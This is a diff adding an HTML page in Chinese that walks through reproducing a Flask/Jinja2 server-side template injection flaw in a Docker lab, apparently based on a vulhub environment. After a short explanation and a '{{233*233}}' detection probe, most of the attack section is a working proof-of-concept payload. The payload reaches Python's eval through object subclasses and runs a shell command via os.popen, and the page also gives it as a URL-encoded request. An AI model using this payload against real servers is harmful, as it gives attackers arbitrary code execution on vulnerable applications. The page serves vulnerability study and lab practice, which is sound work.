@@ -1,0 +1,32 @@
+﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
+		</title>
+		<style type="text/css">
+			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
+			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
+			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
+			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
+			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
+			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
+			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
+			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
+			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
+		</style>
+	</head>
+	<body>
+		<h1 class="csAD577193">
+			<a name="flask--jinja2-ssti-服务端模版注入攻击"><span class="csDE05BCC">Flask / jinja2 SSTI </span><span class="csECDA2D3">服务端模版注入攻击</span></a></h1>
+		<h2 class="cs868C439D">
+			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9FB05234">SSTI</span><span class="cs9C1B1871">即服务端模版注入攻击。由于程序员代码编写不当，导致用户输入可以修改服务端模版的执行逻辑，从而造成</span><span class="cs9FB05234">XSS</span><span class="cs8926E06">,</span><span class="cs9C1B1871">任意文件读取，代码执行等一系列问题。</span></p><h2 class="cs868C439D">
+			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
+		<h2 class="cs868C439D">
+			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
+		<p class="cs40DD2BC9"><span class="cs9C1B1871">编译及运行测试环境：</span></p><p class="cs3A447A38"><span class="cs9FB05234">docker-compose build</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">docker-compose up -d</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span><span class="cs9FB05234">http://www.0-sec.org/?name={{233*233}}</span><span class="cs9C1B1871">，得到</span><span class="cs8926E06">54289</span><span class="cs9C1B1871">，说明</span><span class="cs8926E06">SSTI</span><span class="cs9C1B1871">漏洞存在。</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">获取</span><span class="cs8926E06">eval</span><span class="cs9C1B1871">函数并执行任意</span><span class="cs8926E06">python</span><span class="cs9C1B1871">代码的</span><span class="cs8926E06">POC</span><span class="cs9C1B1871">：</span></p><p class="cs3A447A38"><span class="cs9FB05234">{% for c in [].__class__.__base__.__subclasses__() %}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{% if c.__name__ == &#39;catch_warnings&#39; %}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{% for b in c.__init__.__globals__.values() %}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{% if b.__class__ == {}.__class__ %}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{% if &#39;eval&#39; in b.keys() %}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{{ b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;id&quot;).read()&#39;) }}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;{% endif %}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{% endif %}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;{% endfor %}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{% endif %}</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">{% endfor %}</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">访问</span><span class="cs9FB05234">http://www.0-sec.org:8000/?name=%7B%25%20for%20c%20in%20%5B%5D.__class__.__base__.__subclasses__()%20%25%7D%0A%7B%25%20if%20c.__name__%20%3D%3D%20%27catch_warnings%27%20%25%7D%0A%20%20%7B%25%20for%20b%20in%20c.__init__.__globals__.values()%20%25%7D%0A%20%20%7B%25%20if%20b.__class__%20%3D%3D%20%7B%7D.__class__%20%25%7D%0A%20%20%20%20%7B%25%20if%20%27eval%27%20in%20b.keys()%20%25%7D%0A%20%20%20%20%20%20%7B%7B%20b%5B%27eval%27%5D(%27__import__(%22os%22).popen(%22id%22).read()%27)%20%7D%7D%0A%20%20%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endif%20%25%7D%0A%20%20%7B%25%20endfor%20%25%7D%0A%7B%25%20endif%20%25%7D%0A%7B%25%20endfor%20%25%7D</span><span class="cs9C1B1871">，得到执行结果：</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Jinja2/Jinja2%20SSTI%20%e6%9c%8d%e5%8a%a1%e7%ab%af%e6%a8%a1%e7%89%88%e6%b3%a8%e5%85%a5%e6%94%bb%e5%87%bb_files/image0.png" width="560" height="85" alt="" style="border-width:0px;" /></span></p><h2 class="cs868C439D">
+			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
+		<p class="cs6FD73CFB"><span class="cs8926E06">https://drops.org.cn/Python/flask-jinja2-ssti.html#directory072591889128396616</span></p><p class="cs6FD73CFB"><span class="cs8926E06">https://vulhub.org/#/environments/flask/ssti/</span></p></body>
+</html>
